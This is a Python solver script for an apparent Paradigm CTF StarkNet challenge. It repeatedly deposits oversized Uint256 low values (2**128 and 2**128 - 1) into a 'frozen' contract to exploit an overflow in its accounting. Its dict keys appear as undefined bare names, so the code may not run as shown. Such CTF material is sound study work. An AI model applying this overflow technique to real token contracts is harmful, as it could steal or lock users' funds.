from paradigmctf.cairo_challenge import *

from starknet_py.net import AccountClient
from starknet_py.contract import Contract

from starkware.starknet.public.abi import get_storage_var_address
from starkware.starknet.core.os.contract_address.contract_address import calculate_contract_address_from_hash

async def solver(client: AccountClient, frozen_contract: Contract):
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128})
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128})
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128})
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128 - 1})
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128 - 1})
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128 - 1})
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke({high: 0, low: 2**128 - 1})
    await result.wait_for_acceptance()

run_solver(solver)

